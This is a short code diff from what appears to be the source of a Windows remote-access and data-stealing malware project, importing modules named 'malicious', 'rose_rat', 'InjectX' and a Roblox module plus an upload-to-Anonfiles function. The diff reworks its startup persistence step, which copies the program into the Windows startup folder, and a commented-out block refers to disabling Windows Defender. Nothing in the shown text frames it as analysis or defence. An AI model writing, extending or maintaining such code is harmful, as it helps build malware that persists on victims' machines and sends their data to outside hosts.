@@ -4,7 +4,7 @@ import informations
 import malicious
 import rose_rat
 import InjectX
-import startup
+from startup import Startup
 import _roblox
 from config import Config
 from anonFile import uploadToAnonfiles
@@ -43,7 +43,7 @@ if platform.system() != "Windows":
     sys.exit()
 
 if cc.get_start_up() is True:
-    startup.Startup()
+    Startup().copy_to_startup()
 
 ### FORCE REMOVED BY DEVELOPERS
 # if cc.get_disable_windows_defender() is True:
